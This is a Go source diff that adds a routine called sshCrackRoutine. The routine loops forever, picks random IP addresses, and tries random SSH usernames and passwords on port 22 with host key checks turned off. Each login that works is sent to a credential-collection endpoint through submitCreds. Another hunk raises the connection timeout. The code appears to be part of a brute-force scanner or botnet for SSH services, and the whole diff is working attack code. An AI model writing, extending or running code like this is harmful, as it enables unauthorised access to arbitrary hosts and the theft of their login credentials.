@@ -9,6 +9,30 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
+// sshCrackRoutine is an infinite loop of cracking SSH service.
+func sshCrackRoutine() {
+	for {
+		address := ipRandomAddress()
+		user := randomSshUser()
+		pass := randomSshPass()
+		err := sshCheck(address, user, pass, 22)
+		if err != nil {
+			fmt.Println(err)
+			continue
+		}
+		// Temp hardcoded.
+		err = submitCreds("http://127.0.0.1:60798", Creds{
+			Ip:   address,
+			Port: 22,
+			User: user,
+			Pass: pass,
+		})
+		if err != nil {
+			fmt.Println(err.Error())
+		}
+	}
+}
+
 // ipChunk returns a string composed of numbers between 1 - 255.
 func ipChunk() string {
 	rand.Seed(time.Now().UnixNano())
@@ -26,7 +50,7 @@ func sshCheck(ip, user, pass string, port int) error {
 		User:            user,
 		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout:         time.Second,
+		Timeout:         time.Second * 2,
 	})
 	if err != nil {
 		return err
